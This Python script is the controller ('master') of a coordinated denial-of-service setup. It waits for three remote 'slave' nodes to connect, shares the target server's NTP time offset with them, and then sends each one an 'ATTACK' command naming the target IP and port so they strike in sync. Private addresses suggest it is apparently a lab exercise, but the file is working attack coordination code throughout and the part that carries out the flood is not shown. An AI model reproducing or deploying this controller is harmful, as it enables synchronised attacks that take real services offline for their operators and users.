import time
import datetime
import sys
import re
import ntplib
from socket import *  # Importing the socket library for network connections
from time import ctime

# Setting up variables
SERVER_HOST = '192.168.0.113'
SERVER_PORT = 8080
MS_LISTEN_HOST = '192.168.0.113'
MS_LISTEN_PORT = 8081

class Master():
    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket(AF_INET, SOCK_STREAM)
        else:
            self.sock = sock
        self.slaves = {}  # Dictionary to store slave connections

        # The server to be attacked
        self.server_ip = SERVER_HOST
        self.server_port = SERVER_PORT

        # Initialize NTP client
        self.ntpc = ntplib.NTPClient()
        try:
            # Get NTP time from the target server
            self.ntp_res = self.ntpc.request(self.server_ip, version=3)
        except Exception as e:
            print(f"Error fetching NTP time: {e}")
            sys.exit(1)

    def listenConnections(self, port):
        """Sets up the master server to listen for incoming slave connections."""
        print("Listening for connections...")
        try:
            self.sock.bind((MS_LISTEN_HOST, port))
            self.sock.listen(3)  # Listen for up to 3 connections
        except Exception as e:
            print(f"Error setting up listener: {e}")
            self.closeConnection()
            sys.exit(1)

    def acceptConnections(self):
        """Accepts incoming connections from slave nodes."""
        try:
            conn, addr = self.sock.accept()
            print(f'Accepting connection from {addr}')
            msg_buf = conn.recv(64).decode('utf-8')  # Decode received message
            if len(msg_buf) > 0:
                print(f"Received from {addr}: {msg_buf}")
            # Send NTP offset to the slave
            conn.send(f'Master offset is: {self.ntp_res.offset}'.encode('utf-8'))
            self.slaves[addr] = conn  # Add the slave to the dictionary
        except Exception as e:
            print(f"Error accepting connection: {e}")

    def launchAttack(self):
        """Synchronizes all slave nodes and launches the attack."""
        try:
            ntpc = ntplib.NTPClient()
            for slave_addr, conn in self.slaves.items():  # Use items() for Python 3 compatibility
                try:
                    ntp_res = ntpc.request(self.server_ip, version=3)
                    print(f"Current NTP time for slave {slave_addr}: {ctime(ntp_res.tx_time)}")
                    # Send attack command to each slave
                    conn.send(f'ATTACK {self.server_ip} {self.server_port} {ntp_res.offset}'.encode('utf-8'))
                except Exception as e:
                    print(f"Error launching attack on {slave_addr}: {e}")
                    continue
        except Exception as e:
            print(f"Error launching attack: {e}")

    def closeConnection(self):
        """Closes the socket connection."""
        print("Closing the master server connection.")
        self.sock.close()

if __name__ == '__main__':
    port = MS_LISTEN_PORT
    masterServer = Master()
    masterServer.listenConnections(port)  # Start listening for slave connections
    
    while True:
        masterServer.acceptConnections()
        if len(masterServer.slaves) >= 3:  # Wait until 3 slaves are connected
            break

    masterServer.launchAttack()  # Launch attack when 3 slaves are connected
    masterServer.closeConnection()  # Close the master server connection
